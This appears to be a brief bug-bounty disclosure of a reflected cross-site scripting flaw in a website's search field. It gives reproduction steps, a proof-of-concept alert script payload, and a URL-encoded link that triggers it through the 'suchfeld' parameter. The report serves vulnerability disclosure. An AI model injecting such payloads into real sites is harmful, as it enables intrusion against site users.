*XSS with GET URL parameter* 
Steps to reproduce:
2. Go to https://www.domain/
3. In the search enter: "<script>alert(`OPENBUGBOUNTY`)</script>
4. Submit the search and XSS alert will pop up.

Alternatively visiting this URL will trigger the XSS.
https://www.domain/inc.search_neu.php?suchfeld=%22%3Cscript%3Ealert(%60OPENBUGBOUNTY%60)%3C%2Fscript%3E